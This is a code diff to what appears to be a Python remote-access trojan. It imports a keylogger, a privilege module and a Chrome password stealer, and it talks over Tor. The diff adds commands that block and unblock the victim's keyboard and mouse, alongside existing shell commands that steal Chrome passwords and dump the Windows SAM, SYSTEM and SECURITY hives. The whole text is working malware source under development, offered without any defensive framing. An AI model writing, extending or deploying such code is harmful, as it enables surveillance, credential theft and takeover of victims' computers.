@@ -14,8 +14,7 @@ from mss import mss
 from tor_network import ClientSocket, Tor
 
 # Local tools to the application
-from tools import keylogger,privilege,chrome
-
+from tools import keylogger,privilege,chrome,peripherals
 #constraints
 ENCODING = 'utf-8'
 
@@ -171,6 +170,20 @@ def chrome_passwords():
     except Exception as e:
         reliable_send('[-] Error getting passwords from chrome',e)
 
+#not yet tested
+def block_peripherals():
+    try:
+        res = peripherals.block()
+        reliable_send(res)
+    except Exception as e:
+        print(e)
+
+def unblock_peripherals():
+    try:
+        res = peripherals.unblock()
+        reliable_send(res)
+    except Exception as e:
+        print(e)
 
 def shell():
     while True:
@@ -238,6 +251,12 @@ def shell():
         #still error in chrome_pass
         elif command[:11] == 'chrome_pass':
             chrome_passwords()
+
+        #peripherals toggle not yet tested
+        elif command[:8] == "inpblock":
+            block_peripherals()
+        elif command[:10] == "inpunblock":
+            unblock_peripherals()
 
         elif command[:8] == 'sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
